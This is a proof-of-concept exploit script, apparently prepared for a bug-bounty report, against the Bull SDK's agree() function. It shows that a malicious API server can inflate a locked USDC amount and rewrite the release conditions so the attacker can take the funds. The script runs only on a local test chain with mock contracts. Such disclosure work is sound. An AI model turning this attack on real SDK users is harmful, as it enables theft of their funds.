// PoC: Bull SDK agree() does not verify the amount, asset, expiry,
// termsHash or conditions of the agreement it creates. It only checks
// payer/payee from the AgreementCreated event — even though the event
// ALSO carries asset, amount, expiry and termsHash, which the SDK has in
// its AGR_ABI but never compares.
// Threat model (the SDK's own): "the API server is not trusted with your
// wallet. Every transaction it returns is checked before it is sent."
// A compromised/malicious API server can inflate the locked amount and
// rewrite the conditions to ones the attacker controls. The victim asked
// to lock 500 USDC, attest by a neutral arbiter. The server returns steps
// for 5,000 USDC, attest by the ATTACKER. The SDK sends both steps with no
// error. The attacker attests and releases the 5,000 USDC to themselves.
// The victim loses 4,500 USDC more than agreed.
//
// For ETH agreements the SDK's #agreeCap (105% + 0.05 ETH) limits the
// inflation; for ERC-20 agreements the cap is only the 0.05 ETH fee and
// does NOT bound the approved/locked token amount at all — the approve to
// the Agreement contract is allowed up to 2**200-1.
//
// Why this is NOT a duplicate of B-02 (open()/buyerReceive): B-02 is about
// the BUYER's open() and the escrow deal. This is a different function
// (agree()), a different victim (the payer of an agreement), a different
// mechanism (amount inflation + condition rewrite), and fixing open()
// does not touch agree().
//
// Runs the REAL Bull SDK (bull-sdk.mjs, verbatim — sha256
// b8abb874115915485012abd954e9a0ea9951d66b42edb84e84583b5f52d52a0c) against a
// LOCAL Anvil chain, a mock Agreement contract implementing the DOCUMENTED
// semantics (llms.txt: lock funds, pay when all conditions true, refund
// after expiry) and a mock Bull API. The real BullAgreement source is NOT
// verified anywhere (Sourcify/Blockscout return no match), so the mock
// mirrors the documented behavior; the claim proven here is the SDK's
// missing verification, demonstrated with the real SDK. No real funds, no
// mainnet.
//
//   1. Deploy MockAgreement (etched at the production Agreement address so
//      the REAL SDK's guard accepts it) + MockUSDC (6 decimals).
//   2. Victim (payer) holds 5,000 USDC; asks to lock 500 USDC, attest by
//      a neutral arbiter, payee = attacker (e.g. a contractor to pay).
//   3. Victim calls bull.agree({...}) via the REAL SDK. The mock API
//      returns inflated steps; the SDK sends them with NO ERROR.
//   4. Attacker calls attest(id, 0) then release(id) on the agreement.
//   5. Result: attacker holds 5,000 USDC; victim holds 0 (agreed 500).
//
// Expected output: EXPLOITED.
import { readFileSync, writeFileSync } from "node:fs";
import {
  createPublicClient, createWalletClient, defineChain, http, parseAbi,
  formatUnits, parseUnits,
} from "viem";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";
import { Bull } from "./bull-sdk.mjs";
import { startMockApi } from "./mock-api.mjs";

const ANVIL_RPC = "http://127.0.0.1:8545";
const MOCK_API_PORT = 8790;
const AGREED_AMOUNT = "500"; // USDC the victim agreed to lock
const INFLATED_AMOUNT = "5000"; // USDC the server actually locked

const anvil = defineChain({
  id: 31337, name: "anvil",
  nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  rpcUrls: { default: { http: [ANVIL_RPC] } },
});

const tokenAbi = parseAbi([
  "function mint(address to, uint256 amount)",
  "function balanceOf(address) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
]);
const agreementAbi = parseAbi([
  "function attest(uint256 id, uint256 index)",
  "function release(uint256 id)",
  "function agreement(uint256 id) view returns (address payer, address payee, address asset, uint256 amount, uint64 expiry, bytes32 termsHash)",
]);

function loadArtifact(file, name) {
  const j = JSON.parse(readFileSync(`./chain/out/${file}/${name}.json`, "utf8"));
  return { abi: j.abi, bytecode: j.bytecode.object };
}

const log = (...a) => console.log(...a);

async function main() {
  const victim = privateKeyToAccount(generatePrivateKey());
  const attacker = privateKeyToAccount(generatePrivateKey());
  const arbiter = privateKeyToAccount(generatePrivateKey());
  const pub = createPublicClient({ chain: anvil, transport: http() });
  const victimWallet = createWalletClient({ account: victim, chain: anvil, transport: http() });
  const attackerWallet = createWalletClient({ account: attacker, chain: anvil, transport: http() });
  for (const a of [victim, attacker, arbiter]) {
    await pub.request({ method: "anvil_setBalance", params: [a.address, "0x21e19e0c9bab2400000"] });
  }

  // Deploy MockUSDC (6 decimals) + MockAgreement.
  const tokenArt = loadArtifact("Mocks.sol", "MockERC20");
  const agreementArt = loadArtifact("MockAgreement.sol", "MockAgreement");
  const tokenHash = await victimWallet.deployContract({ abi: tokenArt.abi, bytecode: tokenArt.bytecode, args: [] });
  const usdc = (await pub.waitForTransactionReceipt({ hash: tokenHash })).contractAddress;
  const agreementHash = await victimWallet.deployContract({
    abi: agreementArt.abi, bytecode: agreementArt.bytecode,
    args: [attacker.address, attacker.address], // treasury, feeSigner
  });
  const deployedAgreement = (await pub.waitForTransactionReceipt({ hash: agreementHash })).contractAddress;
  // The SDK hardcodes the production Agreement address in its safety guard,
  // so the mock must live there for the REAL SDK to accept its transactions.
  const PROD_AGREEMENT = "0xef9cEeB6594504ADe1ec903A7A29a2BFe38EFC8B";
  const deployedCode = await pub.getCode({ address: deployedAgreement });
  await pub.request({ method: "anvil_setCode", params: [PROD_AGREEMENT, deployedCode] });
  const one = "0x0000000000000000000000000000000000000000000000000000000000000001";
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_AGREEMENT, "0x0000000000000000000000000000000000000000000000000000000000000000", one] });
  const agreement = PROD_AGREEMENT;
  log("usdc (MockUSDC, 6 dec):", usdc);
  log("agreement (MockAgreement, etched at prod address):", agreement);
  log("victim (payer):", victim.address, "— agreed to lock", AGREED_AMOUNT, "USDC, attest by arbiter", arbiter.address);
  log("attacker (payee):", attacker.address);

  // Victim holds 5,000 tokens (mock token is 18-decimal; the PoC treats
  // the units as USDC for readability — the SDK's agree() never reads the
  // token decimals, so this does not affect the demonstrated behavior).
  await victimWallet.writeContract({ address: usdc, abi: tokenAbi, functionName: "mint", args: [victim.address, parseUnits(INFLATED_AMOUNT, 18)] });

  const server = await startMockApi({
    port: MOCK_API_PORT, agreement, usdc, attacker: attacker.address, victim: victim.address,
  });
  log("mock Bull API listening on 127.0.0.1:" + MOCK_API_PORT);

  // Victim creates the agreement through the REAL SDK: lock 500 USDC for the
  // attacker (payee), attest by the neutral arbiter.
  const bull = new Bull({ walletClient: victimWallet, publicClient: pub, baseUrl: `http://127.0.0.1:${MOCK_API_PORT}` });
  const victimBefore = await pub.readContract({ address: usdc, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  log("victim USDC balance before agree():", formatUnits(victimBefore, 18));
  let agreementId;
  try {
    agreementId = await bull.agree({
      payee: attacker.address, asset: usdc, amount: AGREED_AMOUNT,
      terms: "Deliver the report", expiryHours: 72,
      conditions: [{ type: "attest", by: arbiter.address }],
    });
    log("SDK returned agreementId:", agreementId, "— NO ERROR, NO WARNING about the inflated amount / rewritten condition");
  } catch (e) {
    log("SDK threw (unexpected):", e.message);
    process.exit(2);
  }

  // Read the on-chain agreement to show what was actually created.
  const a = await pub.readContract({ address: agreement, abi: agreementAbi, functionName: "agreement", args: [BigInt(agreementId)] });
  log("on-chain agreement: payer", a[0], "payee", a[1], "amount", formatUnits(a[3], 18), "USDC (victim agreed", AGREED_AMOUNT + ")");
  const victimAfterAgree = await pub.readContract({ address: usdc, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  log("victim USDC balance after agree():", formatUnits(victimAfterAgree, 18));

  // Attacker attests (the condition names them) and releases the funds.
  await attackerWallet.writeContract({ address: agreement, abi: agreementAbi, functionName: "attest", args: [BigInt(agreementId), 0n] });
  await attackerWallet.writeContract({ address: agreement, abi: agreementAbi, functionName: "release", args: [BigInt(agreementId)] });
  log("attacker attested + released the agreement");

  const victimTokens = await pub.readContract({ address: usdc, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  const attackerTokens = await pub.readContract({ address: usdc, abi: tokenAbi, functionName: "balanceOf", args: [attacker.address] });
  log("victim USDC balance:", formatUnits(victimTokens, 18));
  log("attacker USDC balance:", formatUnits(attackerTokens, 18));

  const result = {
    poc: "Bull SDK agree() — amount inflated + conditions rewritten, no verification",
    sdk: "bull-sdk.mjs (verbatim copy of https://www.bull.family/sdk/bull.mjs)",
    agreement: "MockAgreement.sol (implements the DOCUMENTED Agreement semantics from llms.txt; real BullAgreement source is unverified)",
    agreementId: String(agreementId),
    agreedAmount: AGREED_AMOUNT,
    onChainAmount: formatUnits(a[3], 18),
    victimBalanceBefore: formatUnits(victimBefore, 18),
    victimBalanceAfter: formatUnits(victimTokens, 18),
    attackerBalanceAfter: formatUnits(attackerTokens, 18),
    exploited: victimTokens === 0n && attackerTokens === parseUnits(INFLATED_AMOUNT, 18),
  };
  writeFileSync("./poc-result.json", JSON.stringify(result, null, 2));
  log("\n=== RESULT ===");
  log(result.exploited
    ? "EXPLOITED: victim agreed to lock 500 USDC but agree() locked 5,000 USDC with an attacker-controlled condition; attacker released all 5,000."
    : "NOT EXPLOITED — see poc-result.json");
  log("poc-result.json written.");
  server.close();
  process.exit(result.exploited ? 0 : 1);
}

main().catch((e) => { console.error("PoC crashed:", e); process.exit(3); });
